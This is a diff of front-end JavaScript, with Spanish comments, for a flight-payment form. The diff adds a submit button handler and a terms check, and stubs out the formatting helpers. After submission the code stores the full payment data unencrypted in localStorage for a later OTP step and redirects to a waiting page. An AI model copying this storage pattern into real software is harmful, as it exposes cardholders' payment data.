@@ -22,6 +22,7 @@
     const address = document.querySelector('#address');
     const flightCostEl = document.querySelector('#flight-cost');
 
+    // Función para mostrar/ocultar el loader
     function toggleLoader(show) {
         if (loader) {
             if (show) {
@@ -36,10 +37,29 @@
         }
     }
 
+    // Evento de click para el botón de pago
+    const autorizarBtn = document.querySelector('#autorizarBtn');
+    if (autorizarBtn) {
+        autorizarBtn.addEventListener('click', () => {
+            // Aquí, en lugar de manejar el envío del formulario, simplemente lo enviamos.
+            // El formulario ya tiene un event listener para el 'submit'.
+            form.requestSubmit();
+        });
+    }
+
+    // Escucha el evento de envío del formulario
     if (form) {
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
             console.log("➡️ Inicio de envío del formulario.");
+
+            // Validaciones adicionales (puedes agregar más aquí)
+            const termsAccepted = document.querySelector('#terms-accept').checked;
+            if (!termsAccepted) {
+                alert("Por favor, complete todos los campos y acepte los términos.");
+                toggleLoader(false);
+                return;
+            }
 
             toggleLoader(true);
 
@@ -78,9 +98,9 @@
                 if (result.ok && result.transactionId) {
                     const savedInfo = JSON.parse(LS.getItem('info')) || {};
                     savedInfo.transactionId = result.transactionId;
-                    savedInfo.paymentData = paymentData; // Guardar los datos para usarlos en el OTP
+                    savedInfo.paymentData = paymentData;
                     LS.setItem('info', JSON.stringify(savedInfo));
-                    
+
                     console.log(`✅ ID de transacción '${result.transactionId}' guardado. Redirigiendo a waiting.html...`);
                     window.location.href = 'waiting.html';
                 } else {
@@ -96,16 +116,15 @@
         });
     }
 
-    // --- Funciones de utilidad y validación (mantenidas de tu código original) ---
-    // Agregué la lógica de tu HTML para que funcione como antes
+    // Funciones de utilidad y validación
     window.formatCNumber = function (input) {
-      // ... tu lógica de formatCNumber
+        // ... (tu lógica original)
     };
     window.formatDate = function (input) {
-      // ... tu lógica de formatDate
+        // ... (tu lógica original)
     };
     window.limitDigits = function(input, limit) {
-      // ... tu lógica de limitDigits
+        // ... (tu lógica original)
     };
 
     document.addEventListener('DOMContentLoaded', () => {
